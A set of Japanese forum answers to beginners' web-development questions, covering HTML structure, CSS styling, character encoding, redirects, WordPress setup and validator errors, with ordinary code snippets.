そもそもimg alt の目的を理解されていないようですね。 これは本来、視覚障害者がウェッブを読むためのタグです。 視覚障害者は読み上げリーダーでウェッブを見ますが、リーダーは画像タグをみると、altをよみあげます。 読み上げリーダーで正しく設定されているかを確認して下さい。 ウェッブ上で表示が問題せはありません。 ブラウザのHTML解析がおかしいのでしょう。
いいえ。常に &amp; にします。
リンクやボタンというのは<a>や<input>、<button>タグ全般の事だと思います。 「押せるもの同士が近かったら押し間違えちゃうでしょ？」という意味のエラーですね。 スマホ対応していないサイトは、ほぼこのエラーが出ます。 スマホでPCサイトを全画面で表示してみると、十分離れているリンクも当然近くなるので。 経験上、レスポンシブデザインで作ったサイトの場合はリンク同士が密着していてもこのエラーは出なかったので、とにかくスマホ対応をすればエラーは出なくなるような気がしますが。 スマホ対応しているサイトでこのエラーが出るのは私が作ったものの中では経験が無いので、逆にどういうサイトか知りたいですね。
間違いではありませんが、Strict（厳密型）ですからエラーになります。 Transitional（移行型）にすればエラーは出ません。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
kei.htmlに通常の遷移（ajaxではなく）をしたいのでしたら <a href="kei.html" data-ajax="false"> というように data-ajax="false"を追加してください。 ★まずいとこ <script src="../jquerymobile/jquery.js"></script> <script src="../jquerymobile/jquery.mobile-1.4.5.js"></script> <script src="http://code.jquery.com/jquery-1.11.1.min.js"></script> jQueryを二回呼んでいます。 CDNを使うなら以下のようにしましょう。 <script src="//code.jquery.com/jquery-1.11.1.min.js"></script> <script src="//code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.min.js"></script> ついでにCSSも。 <link rel="stylesheet" href="http://code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.min.css" /> ★無駄なとこ <li>にpopmenu1などidがそれぞれ設定してある それぞれidを設定するのは面倒なので<ul>にidを設定し、<li>はそこから相対的に指定したりすると楽です。
t_ohta さんが指摘された「Authors should use "&amp;"」は HTML 4.01 から引用したものだと思われますが、その手前に「また、著者は、「&」の代わりに「&amp;」(ASCII十進38)を用い、文字参照の冒頭――文字実体参照の開始区切り子――と誤解されるのを避けるべきである。」ともあります。 http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401j/charset.html#h-5.3.2 http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401j/charset.html#h-5.3.2 HTML5 ではブラウザ間の互換性問題を吸収する為か "&amp" も "&" を参照するように変更されました。 https://html.spec.whatwg.org/multipage/syntax.html#named-character-references 従って、次のように解釈されることになります。 <a href="http://example.com/?hoge=foo&amp=piyo">http://example.com/?hoge=foo&amp=piyo</a> 　↓ <a href="http://example.com/?hoge=foo&=piyo">http://example.com/?hoge=foo&=piyo</a> この挙動はWeb製作者の期待通りではないでしょうし、既存の Named Reference と一致しない名前を使用するように一つずつ HTML 仕様書をチェックするのは現実的ではありません。 また、将来的に Named Reference が増える可能性も踏まえると、HTML文字実体参照になってしまうリスクを負うのはよろしくないと思われます。 また、http://validator.w3.org/ で "&" がHTML文字実体参照でないHTMLをcheckすると warning ではなく、Errors として判定されます。 すくなくとも、Markup Validator では RFC2119 の "MUST NOT" に近い意味がこめられていると思われます。 結論としては「開発者にHTMLの知識がない」が正解だと思います。 # Re: mureimonoさん
<iframe></iframe>の中にある、image/001.mp4という画像はなんですか？・・・ iconの表示であれば意味が解りますが、動画であれば、videoの指定が必要なのでは？・・・ <video poster="images/***.jpg" autoplay controls> <source src="video/001.mp4"> <source src="video/001.ogv"> <p>動画を再生するには、videoタグをサポートしたブラウザが必要です。</p> </video> また、すべてのブラウザで再生させるために、.ogv形式のファイルも、アップする必要があると思います。
やはり <link rel="stylesheet" type="text/css "href="css/style.css"> これが問題でしたね。 ”とhrefがくっついているので、空白を入れてください。
<style> #nav li { display: inline; list-style-type: none; padding-right: 30px; } table{ width:15%; } </style> <body> <h1 id="logo"><a href="index.html"><img src="images/logo1.png"width="400"height="200"alt="KUJIRA cafe"</a></h1> <ul id="nav"> <li><a href="index.html">ホーム</a></li> <li><a href="about.html">店舗案内</a></li> <li><a href="access.html">アクセス</a></li> <li><a href="menu.html">メニュー</a></li> <li><a href="contact.html">お問い合わせ</a></li> </ul> </body> で書いたら、横並びになってますよ。ｗ ↑これが問題ではないのでは？ <link href="./style.css" rel="stylesheet" type="text/css"> このパス(href="./style.css")とか間違えてませんか？ CSSファイルを保存したときの文字コードとかもどうですか？
ページのソースはブラウザの機能で見る事が出来ます。 大概のブラウザは、表示されている画面で右クリックをするとメニューが表示され、その中にソース表示の機能があります。 他人の作ったソースを使って似たようなサイトを作る場合に注意する点は、 ・コンテンツそのもの（文章や画像）は使用しない（HTMLの構造だけ真似る） ・サイト構成は独自で考える と言った所だと思います。 コンテンツそのものをコピーしたら著作権法違反になります。 類似した内容でサイト構成を丸ごと真似ると、商用の場合不正競争防止法違反になる可能性があります。
HTMLの記述は？・・・ <table class="right"　summary=""　border=1"> <thead> <th></th> <th></th> </thead> <tbody> <tr> <td></td> </tr> <tr> <td></td> </tr> </tbody> </table> という様に、なっていますか？・・・ CSSでの設定は、 table{ width:15%; height:auto; border:solid 1px #ccc; } .right{ text-align:right; margin-right:2em; } などの記述が、あると思いますが？・・・ また、テーブル内の文字の一などは、各<th>,<tr>,<td>に、classを設け設定してください！
アンダーライン表示されるのは syntax で htmlLink が :highlight htmlLink htmlLink xxx links to Underlined と Underlined に link されてるからなので、これが嫌なら link を別のものにするか, Underlined 自体を override するかです。要は :hi link htmlLink Comment とするか (Comment は適当) :hi Underlined term=bold cterm=NONE gui=NONE みたいにすればアンダーラインは消えると思います。
ご質問の部分だけで言えば、rowspan="4"で左側は4行分連結しているのに右側分のtdが3行分しか無いんですね。 2は1の行のtr内に入れてください。 <html> <body> <br><center> <font size="6" color="#00000"> <b>タイトル</b> </font> <hr> <br><br> <table width="800" height="500" cellpadding="15" cellspacing="10" BORDER="4" bgcolor="F3F30E"> <tr> <td width="50%" rowspan="3" BGCOLOR="F2F276" ALIGN="left" VALIGN="top"> <font color="#00000" size="4"><b><u> 1 </u></b></font> <br><br> <font size="3" color="#00000"> </font> </td> <td width="50%" bgcolor="F2F276" ALIGN="left" VALIGN="top"> <font color="#00000" size="4"><b><u> 2 </b></u></font> <br><br> <font size="3" color="#00000"> </font> </td> </tr> <tr> <td width="50%" bgcolor="F2F276" ALIGN="left" VALIGN="top"> <font color="#00000" size="4"><b><u> 3 </b></u></font> <br><br> <font size="3" color="#00000"> </font> </td </tr> <tr> <td width="50%" bgcolor="F2F276" ALIGN="left" VALIGN="top"> <font color="#00000" size="4"><b><u> 4 </b></u></font> <br><br> <font size="3" color="#00000"> <b></b> </font> </td> </tr> </table> </body> </html>
input[type="text"] {width:500px;height:60px;} とか。
Another HTML Lint https://www.google.co.jp/search?hl=ja&lr=&ie=UTF-8&oe=UTF-8&num=50&q=HTML+Lint&gws_rd=cr,ssl&ei=Cq7RVPTwL6e7mQWqrIKIBw#hl=ja&q=Another+HTML+Lint
<script> if(UAがスマホなら){ location.href('スマホページURL'); } </script>
「ネットワークAPI」とは？？ もしかして、ウェブAPIの事ですかね？「Web API」で検索しましたか？
というか、「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1 )」は基本ですから、単純にtable書いてスタイルシートで調整するほうが楽ですし危険もない。そもそも上記に書かれているようにメンテナンスも楽になる。失敗したらスタイルシート書き換えればよい。 　スタイルシート使うと、HTML使うよりはるかに多彩なデザインができますよ。HTMLシンプルなのでメンテナンスも楽。 ※タブは　(全角スペース)に置換してあるので戻す。 <table border="1" summary="サンプルの表"> 　<tbody> 　　<tr> 　　　<th>一列目</th><th>二列目</th> 　　</tr> 　　<tr> 　　　<td>1行1列目の要素M</td><td>1行2列目の要素</td> 　　</tr> 　　<tr> 　　　<td>2行1列目の要素</td><td>2行2列目の要素</td> 　　</tr> 　　<tr> 　　　<td>3行1列目の要素</td><td>3行2列目の要素</td> 　　</tr> 　　<tr> 　　　<td>4行1列目の要素</td><td>4行2列目の要素</td> 　　</tr> 　</tbody> 　　</table> に対して、<head></head>内に <style type="text/css"> <!-- table[summary="サンプルの表"]{ border-collapse:separate;/* 分離して描く */ border-spacing:0px 30px;/* 左右の間隔が0px、縦の間隔が30px */ border-style:double; border-color:red; border-width:5px; } table[summary="サンプルの表"] th, table[summary="サンプルの表"] td{ border-style:solid; border-color:blue; border-width:2px 0;/* ボーダーの巾上下2px 左右0 */ padding: 0 20px; } table[summary="サンプルの表"] tr:nth-child(2n) td{ background-color:yellow; } table[summary="サンプルの表"] th{ background-color:aqua; } --> 　</style>
定形外のルビを振るならば <ruby> を使わないで実現するのが現実的かと思います。 HTA となると古い IE が前提なので綺麗に出来ませんが、以下でいかがでしょうか。 数値については調整してください。 <style> p { font-size:1em; line-height:2em; } p .wruby { position: relative; line-height:1em;} p .wruby span { position: absolute; left: 0; top: 0; font-size: 50%; argin-top: -1em; } p .wruby span.down { margin-top: 1em; } </style> <p> これは<span class=wruby>電算機<span>でんさんき</span><span class=down>ordinateur</span></span>です
そこにiframeを使用することが適切かどうかは別にして… (1)tableの幅が小さくなって左に寄っていますので、tableの幅をいっぱいに広げます。 また、ピンク色の枠が入るセルをiframeと同じ300ピクセルに固定します。 具体的には、1行目を <table style="width: 100%"><tr><td style="width: 300px"> のように書き換えます。 これでリンクの文字が白い部分の中央、ウィンドウ全体の右寄りに表示されます。 (2)ウィンドウの右側にも左側のピンク色の部分と同じ幅の余白を設けます。 具体的には、 <DIV style="font-size:600%"> の部分を <DIV style="font-size:600%; margin-right:300px"> のように書き換えます。 これでリンクの文字がウィンドウ全体の中央に表示されます。
互換性を考えるなら1999年勧告のHTML4.01ですね。 ＞98seを使っている者としては気が引けます 　そんなこと最初に言ってくれなきゃ・・・、ですがOSのバージョンは気にしなくて良い。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 もし【相互運用性確保の】努力が成されなければ、Webは互換性のないフォーマット毎に分け隔てられた世界に分割され、すべての関係者にとっての商業的可能性が減少することとなるであろう、大きなリスクを負うこととなる。 　どのバージョンのHTMLも、コンテンツプロバイダの投資が無駄にならないよう、 　￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ また短期間で文書が読み取り不能となったりすることがないよう、産業界の幅広い ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ 賛同を反映するようにされてきた。 ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［HTML4.01仕様書#2.2.1 HTMLの略歴( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.2.1 )］より 　とても大事なところなので読んでおくこと。 　私は、HTML2.0の時代から携わっていますが、HTML3.2(1997年勧告)への反省から、HTML4.01が作られました。その最大のポイントは「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1 )」です。 　Windows98SEの発売が2000年ですから、HTML4.01の勧告(1999年12月)のわずかあとになります。 ※ HTML4.01の構造とプレゼンテーションの分離は、その後のXHTML/HTMLの基本となりました。それ以前のHTMLとは一線を隔している。 　 ＞これからHTMLを作る場合にはXHTMLよりもHTML4.01でやる方が正解でしょうか？ 　HTMLでいうなら、HTML4.01strict または、HTML5です。 　XHTMLは、他のアプリケーションとの連携などの目的があれば選択することになるでしょう。 　HTML5であっても、<head></head>内に <!--[if IE]> <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script> <script src="http://css3-mediaqueries-js.googlecode.com/svn/trunk/css3-mediaqueries.js"></script> <![endif]--> を書いておけば、HTML5を理解できないブラウザでもHTML5が使えます。 しかし、HTML4.01でも構いません。マークアップに厳しいHTML5よりも作成するのはずっと楽です。HTML5では内容とマークアップがとても厳しいです。 　⇒HTML5 における HTML4 からの変更点( http://standards.mitsue.co.jp/resources/w3c/TR/html5-diff ) 　ただし、その場合であっても必ずHTML4.01strictで作成するようにしましょう。 ・HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/conform.html#h-4.1 ) 　これは、HTMLが勧告された今では必須と言っても良いでしょう。HTML5にはstrictしかない!! 　⇒7.2 HTMLバージョン情報( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#version-info ) ＞XHTMLはあまり使われていないようですけれども については、この記事が参考になるでしょう。 　⇒HTML5“とか”アプリ開発入門（1）：Webの3つの問題を解決する「HTML5」とは何なのか (1/2) - ＠IT( http://www.atmarkit.co.jp/ait/articles/1008/30/news106.html ) 　なぜHTML4.01strictで作成すべきかも、この記事を読めば分かります。(2ページ目) 　すなわち、 <body> 　<div class="header"</div> 　<div class="section"</div> 　<div class="footer"</div> </body> のようにマークアップせよということ!! HTML5の新しい要素( http://standards.mitsue.co.jp/resources/w3c/TR/html5-diff/#new-elements )をclass名にして文書構造が分かるようにすること。
普通は、名前の変更はせずに上書きしますが、 事情があって名変する場合には、 「301リダイレクト」で転送設定（推奨されている方法です） ↑ 方法は検索して調べましょう。 301リダイレクトすれば、どちらが先でも、旧ファイルの有無でも、何も問題ないです。 だって、新ページに飛ぶから、旧ページ（旧ファイル）の内容も存在も確認できないから。 重複にならない。更に旧ページの地盤をも引き継いでくれる。
href属性値は、ちゃんと " や ' で囲ってください。 “ とか ” は違う文字です。 間違い <a href=“http://google.com”>Google</a> 正しい <a href="http://google.com">Google</a> 正しい <a href='http://google.com'>Google</a> また、以下の箇所も引用符がおかしいです。 <html lang=“ja”> <meta charset=“utf-8”> まさか、Microsoft Wordみたいな引用符が勝手に修正されるソフトでHTMLを書いたりしてませんよね？
HTML を入力しているソフトウェアは何でしょうか？ メモ帳でしょうか？ 解決案Ａ) ファイルを保存するときに表示されるダイアログに「エンコード」 または「文字コード」という項目がないかを確認しましょう。ある 場合は、その選択肢から UTF-8 を選択して保存してみてください。 解決案Ｂ) メモ帳の場合[5]を以下のように修正してください。 × <meta http-equiv="Content-Type" content="text/html; charset="utf-8" /> ○ <meta http-equiv="Content-Type" content="text/html; charset="shift_jis" /> ※解決案Ａ・Ｂは、どちらか片方を実施してください。 　両方とも実施すると、文字化けが直りません。
No.1 です > ところで、逆に現在のscaleの値も得ることが出来るでしょうか。 > 画像をクリックするたびに、25%->50%->100%->25%->...としたいのです。 スクリプト上で現在の style の設定値を読み取るのは、 なかなかに面倒な処理になりがちです。 参考 https://developer.mozilla.org/ja/docs/Web/API/window.getComputedStyle なので style ではなく class を読み書きしては如何でしょうか。 以下 HTML5/CSS3 での実装例です。 <style> img.quarter { transform:scale(0.25); } img.half { transform:scale(0.5); } img.regular { transform:scale(1); } </style> <script> document.addEventListener('click', function(ev){ var A = [ 'quarter', 'half', 'regular' ]; var x = ev.target; if (! x instanceof HTMLImageElement) return; var i = A.reduce(function(p,v,i){return x.classList.contains(v)? i: p},-1); if (i < 0) return; x.classList.remove(A[i]); x.classList.add(A[ (i+1) % A.length ]); }, false)</script> <body> <p><img src=dummy1.jpg class=regular> クリックにより拡大縮小、初期100% <p><img src=dummy2.png class=half> クリックにより拡大縮小、初期50% <p><img src=dummy3.gif> 対象外の画像
Redirect permanent / http://xxx.jp/wp ↓ RedirectMatch permanent ^/$ http://xxx.jp/wp こうするとどうでっしゃろ。 これは、前者がパスを保ったまま新サイトへ行けなのに対し、後者はルートの場合のみ新サイトへ行けという意味になるんでおま。 つまり、 http://xxx.jp/ → /wpへ飛ぶ http://xxx.jp/a → 飛ばない（aが無ければ404エラー） http://xxx.jp/wp → 飛ばない となるんですわ。 ところで、もっといい方法があるように見受けられます。上記のやり方では、お客様は確かにhttp://xxx.jp/へアクセスしますが最終的にお客様に見えるURL（アドレス欄）はhttp://xxx.jp/wp/ですよね。 /wpにWordPress本体を置いたままhttp://xxx.jp/にてコンテンツを表示させる方法があります。 WordPressに管理者でログインして設定→一般でWordPressアドレス（URL）とサイトアドレス（URL）がともにhttp://xxx.jp/wpとなっていると思いますが、これをサイトアドレスの方をhttp://xxx.jp/にします。そしてドキュメントルートに.htaccessとindex.php（/wp/index.phpをコピー）を置いてindex.phpの方を require( dirname( __FILE__ ) . '/wp-blog-header.php' ); ↓ require( dirname( __FILE__ ) . '/wp/wp-blog-header.php' ); に変更します。.htaccessはWPの表示設定を行ったら生成されるもので大丈夫です。 こうする事で、http://xxx.jp/でサイトを表示、http://xxx.jp/wp/wp-login.phpで管理者ログイン、という風に場所を変える事ができます。
>データがあったら、フラグに値を入れるという、SQLはありますでしょうか。 データがあるかないかを見るのがSQLで、データがあったか無いか判断するのはロジック側の処理だと思うんだけど。 select FLAG from TABLE_NAME; 取得したレコード数の処理 <input type="checkbox" if flag = 1 then checked="checked" end if > こんな感じにしてあげればflagが1のものだけ<input type="checkbox" checked="checked">って出力されるようになる。 ＊ASPの構文はわからないので、適当にあてはめて たぶんSQLでやること、できること ロジック側でやること、出来ること を明確に理解したほうがいい
そういうことなのでは？
＞　ｈｔｔｐｓ://www.sample.com/にアクセスし、内部リンクで<a href="page1.html">にアクセスしたら ＞　ｈｔｔｐｓ://www.sample.com/page1.htmlにアクセスされる、という認識で良いですか？ 合ってます。 ＞　また、jQueryのAjax通信でurl: "getText.php"みたいにアクセスしています。 こちらもHTTPSになります。 ＞　何か独自SSLだと気をつけないといけなようなことってありますか？ 外部から HTTP で来たときに HTTPS に振り替えてやるようにしてあげましょう。
URLでこの形で送る以上は、文字列にしなければなりません。 したがって「データを文字列に変換する」「変換された文字列を元のデータに戻す」プログラムを用意するか、既にあるものを活用するか、です。 決まった方法はありません。 あなたがやろうとしている事に合っている方法を探してください。 例えば、 [1,2,3] 程度なら id=1,2,3 というURLになるように空白とかを調整して送信。 受信側では、 1,2,3 を ','.split(～) で分割。 とか。 データ量がそれほどでなければ、JSONやXMLという方法もあるだろうし、ある程度大きくなったらURLとしては使えないので、別の方法を考える必要があります。
ブラウザのキャッシュじゃないですか？ キャッシュを消して再度読み込み直す or ファビコンのファイル名を変更してHTMLを組み直す 個人的には ファビコンは画像なのでGETのパラメータを動的に付けて新しい物を常に取るようにするのがお勧めです。
ちょっとコードとcssに突っ込みどころがやたら多いですが、とりあえずサファリの隙間を消す事だけで考えるとimgとbrの間にある改行を削除すればいいです。 コード内の改行が半角スペース扱いになる事は結構あるので注意しましょう。
ブラウザは、余計な>があると&gt;と書き直して表示するのでブラウザ経由でソース見たって意味無いです。 　エディタで表示している状態で>>と重複しているはずです。 　見つけ難ければ Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) 　で右上のDATAをクリックして、そこにテキストエディタでのソースを貼り付けてみると指摘してくれる。
補足拝見、連投失礼。 >Wordpressには.htaccessはないので作成しなければ >いけないということでしょうか。 私の少ない経験ながら、無い場合が多い気がします。各レン鯖ごとに或はWPインスコ方法にも依存しているかも知れませんが。私自身は.htaccessが無ければ作ればイイ的なノリですので、あまり気にしてません。 >その場合のやり方など補足していただけると嬉しいです。 先の回答のURLをご覧頂けましたでしょうか？パーマリンクの使い方、として記載したURLです。WPでパーマリンクを設定すると.htaccessが作られます。これができないのなら該当ディレクトリの書き込み権限を疑ってみたり、メモ帳の類で作成＆FTPなどでアップロードする、というのがよく見かける方法です。 レン鯖によっては.htaccessが機能しない場合もあります。もし先のURLをご覧になってもわからない、できないということでしたら、ご利用のレン鯖サポートへ問い合わせてみては如何でしょうか？
＞ 後ろだと不具合があるのか？ きちんと実装されたWebブラウザでは、後ろに書いてあっても不都合はないと思います。HTMLはSGML応用だったので、コメントの書き方も原則としてSGMLの仕様に準じます。 SGMLはJIS規格になっているので、JIS検索 http://www.jisc.go.jp/app/JPS/JPSO0020.html から「JIS X 4151 」「文書記述言語ＳＧＭＬ」で検索すれば、閲覧できます。 この規格書によれば、注釈宣言（p.44）はmdo（つまり<!）とmdc（>）で注釈を挟み、注釈はcom（--）に挟まれた文字列であると定義されています（mdo,com,mdcの定義はp.21の表３）。そして注釈宣言はSGML文書の前書きと内容の中に現れることができると定義されています（p.190-193）。要するに、閉じタグの後ろにコメント（注釈宣言）を書いてはいけないという制限は見あたりません。
○HTTPサーバーにアクセスしていますか?(URLがfile:で始まったりしてはいませんか?) ○CGIを使えるようにHTTPサーバーは設定できていますか? ○.pyをCGIとして実行するように、サーバーの設定はできていますか? あるいは、.pyを.cgiに変更したら動作しますか?
読み返してみると、なぜないかの説明にはなってませんね。 ちょっとHTML/CSSの歴史を復習されると分かると思いますので、まずHTML4.01仕様書の 2.2.1 HTMLの略歴( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.2.1 ) 2.4 HTML 4による文書の著述( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4 ) 　を読んでください。それでピンと来るかも。 　また、 HTML5“とか”アプリ開発入門（1）：Webの3つの問題を解決する「HTML5」とは何なのか (2/2) - ＠IT( http://www.atmarkit.co.jp/ait/articles/1008/30/news106_2.html ) 　の「【問題2】文書内に埋め込まれた「意味」が不明確」あたりも良いですね。 　肝心な事は、あなたが作成するHTMLにおいて、良いマークアップとは、 「「どこからどこまでが重要な本文なのか」「この＜ul＞要素はナビゲーションメニューを表しているのか、文書中の個条書きなのか」すらも分からない」 　ではダメだという事ですね。 　HTML4.01では、「DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 )」でしたね。具体的にいうと ・ここは、このHTMLのヘッダに当たる（本文じゃない）ので 　<div class="header">～</div> ・ここは本文なので 　<div class="section">～</div> ・ここは内容とは直接関係しないので 　<div class="aside">～</div> の様にマークアップされてこられたと思いますが、記事のその部分が、作者にとって主題なのか、そうでないのかは他人には判断できないのです。 　今後、HTML5が主流になると思いますが、HTML5では 『文書をよりよく構造化するために、( http://standards.mitsue.co.jp/resources/w3c/TR/html5-diff/#new-elements )』新しい要素が追加されますので、よりこの流れが進むでしょう。HTML4.01のように、何でもかんでもDIVとclass名はできなくなります。 "Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable.( http://www.w3.org/TR/2012/CR-html5-20121217/grouping-content.html#the-div-element )" 　(著者は、他に適切な要素がないときの最後の手段としてdiv要素を使用することが強く奨励される。) 　文書のアウトラインを構成するブロックはsectionを階層をつけてでマークアップするなど・・。 <body> 　<header></header> 　<section> 　　<h2></h2> 　　<p></p> 　　<section> 　　　<h3></h3> 　　　<p></p> 　　　<section> 　　　　<h4></h4> 　　　　<p></p> 　　　</section> 　　　<aside></side> 　　　<nav></nav> ・・・・ 　4.3.3 The section element( http://www.w3.org/TR/2014/REC-html5-20141028/sections.html#the-section-element ) 　他人の書いた、マークアップはその著者が意図してマークアップしている物なので、他人がその正否を判断することはできないのです。 　スタイルシートは、そのHTMLにおける文書構造に基づいてセレクタ書くのですから・・ section{margin-left:2em;font-size:0.95em;} とすればsectionの階層ごとには左が字下げされ、文字は少しずつ小さくなる、 section section section{margin-left:0;font-size:100%;} とすれば3階層以降は字下げもフォントサイズ縮小もない。 　要は自分で仕様書をよく読んで理解して、自分の意図した通りにマークアップすることが正しいのですよ。　 　とりあえずHTML4.01とCSS2.1の仕様書くらいはマスターしましょう。誰から文句のつけようがないマークアップを自分ですればよい。 　
'data-' で始まる属性は独自データ属性と言い、そのページを書いた人が独自のデータ/属性を使いたい場合に使われます。 http://www.html5.jp/tag/attributes/data.html おそらくですが、素のハイパーリンクではできない、そのリンクをクリックした人の解析やクリックされた回数を集計するという事をやらせるために JavaScript でクリックイベントを付加しているのでしょう。その時に左記の処理を終えた後のページ遷移先が必要になるため、それを JSON で記述しているのだと思います。 ……まあ、上記以上の詳しい処理内容はぐるなびの企業秘密になるのでしょうし、そもそも上記は私の推論に過ぎないのですが。
スタイルシート（CSS3）で背景画像をウィンドウサイズに合わせて調整する方法があります。 http://tips.nishishi.com/css/background-size-css3.html いま作っているhtmlソースに合わせてcssを導入しましょう。 http://homepage.ojaru.jp/css.html
画像の参照先に画像ファイルはありますか？
これ、中身はWebアプリケーションですよ。 「おすすめメニュー」 「お知らせ」 「PickUp情報」 全部、動的出力でしょうね。 そして、他の回答者様がご指摘の通り、（おそらく）MicrosoftのIISサーバで動作、ミドルウェアはASP.NETで稼働しています。 最近のでなく、少し前の、「WebForm」ってやつ。 .aspxというのは.phpや.jspなどと同じように、慣用的に使われている有名な画面テンプレート用の拡張子です。 変更することもできますが、普通はそんなことしませんね。 IISって、ディレクトリだけ指定したときのデフォルトファイル名がDefault.aspxなので、変えないでそのまま使っているんでしょうか。
#2,3,4 です。 #4 の補足を読みました。 .list2 ではなく、.list を書き換える形で実現してみましたが、いかがでしょうか。 http://jsfiddle.net/2VfDu/15/ --- もう少し、スマートに実装したい場合は display: flex が妥当だと思いますが、少し疲れたのでその辺りはご自身で調べて見てください。 http://www.flapism.jp/html/278/ # Re: newly777さん
リダイレクトの場合は次のページへPOSTデータを送れないので無理です。
＞この３つ全てに適用されますよね？ その認識で正しいです。 期待通りにならないのなら、書き方が間違っています。
ちょっとCSS/HTMLともに情報不足過ぎて回答が集まらないのではないでしょうか。 #wonderWrap、header、h1、ul、li、これらが画像でいうどの部分に使用されているのかさっぱりです。 見たところ全部、Youtubeのサムネイル画像を表示するものではないので本件とは関係が無いように思えるのですが。 画像の表示位置に関しての質問ならば、画像を並べるのにどういった方法を使っているのかが分からないとどうしようもないです。単に<img src="ーー"><img src="ーー"><img src="ーー">で並べているのか？divやspanなどの中に<img src="ーー">を入れてdiv/spanにCSSを適用しているのか？　Youtubeから取得した～とのことですので、<img src="ーー">ではなくiframeなどで埋め込みをしているのかとも考えられますし。 またオーバーマウスエフェクトを追加するとおかしくなったというならば、オーバーマウスエフェクトのHTML/CSSも載せるべきです。 ＞空白が上にpaddingしておいた25px分くらい上に生じてしまいます。 ……ならばpaddingが原因ではないのでしょうか？
a.thumbnail { display: block; float: left; margin: 0.3em 10px 0.3em 0; } a.thumbnail img{ position: absolute; } この辺りを削除すればいいのですけど、画像を拡大したら他の画像が押し出されて、それこそデザインが崩れると思うのですが。
＞例えばSEO的な視点での差異やHTMLとしての正否等々、他の視点でも差異があれば知りたいなと思った次第です。 　SEO Search Engine Optimization 検索エンジン最適化 とは、検索エンジンに内容が正確に理解されるように最適化する。分かりやすく言うと文書を構成する要素を最適な要素としてマークアップすることで、ページの内容が検索エンジンに理解されるようにする事です。 <div class="footer"> 　<h3>更新情報</h3> 　<dl class="documentHistry"> 　　<dt id="FIRST-PUBLISHED">First Published</dt> 　　<dd><span class="time">2013</span></dd> 　　<dt id="LAST-MODIFIED">Last Modified</dt> 　　<dd><span class="time">2014-10-03 12:00:00+09:00</span> (JST)</dd> 　</dl> </div> [HTML5] <footer> 　<h3>更新情報</h3> 　<dl class="documentHistry"> 　　<dt id="FIRST-PUBLISHED">First Published</dt> 　　<dd><time>2013</time></dd> 　　<dt id="LAST-MODIFIED">Last Modified</dt> 　　<dd><time>2014-10-03 12:00:00+09:00</time> (JST)</dd> 　</dl> </footer> 　検索エンジンには直接は関係ないでしょうが、他のシステムで使用する時はきちんと書きましょう。
a[href="http://dotinstall.com"] { color: yellow; } 属性に対して指定をする場合は{}じゃなくて[]です。 http://weboook.blog22.fc2.com/blog-entry-268.html ここの17ですね。
ルート相対パス、もしくは相対パスで全部記述すればいいです。 SSLのエラーは、証明書の問題ですからどうでもいいです。 確認すべきは、目的のページアクセスができているかどうかです。 そもそもページ自体の飛び先がhttpsになってないとか、 ページ内でhttpsアクセスになってない要素(imgとか)があるとか。
style="．．．" の中にfont-familyとfont-sizeのスタイルを追加してあげれば出来ます。
Googleのアナリティクスでいいのでは？ http://www.google.com/intl/ja_jp/analytics/
はて？ 画像で良いなら素材配布サイトにいくらでもあるし、 気に入らなければ自作すれば良いだけでは？ 出席確認一覧表のようなものなら立派な「表」だし、「レイアウトを整えるための」にはならないでしょう。
いろいろなメリットがありますが、最大の特徴は国際基準ということです。 語弊を恐れずに言えば、その言語のフォントさえあれば、文字化けを起こしにくいということです。 新しめのサイトであれば、日本のみならず、世界のほとんどのサイトでutf-8になってるので、試しに確認してみるのも面白いかもしれません。逆にshift-jisを使う理由は、既存システムがshift-jisで出来てるから仕方なくなど、ネガティブな理由しか思いつきません。
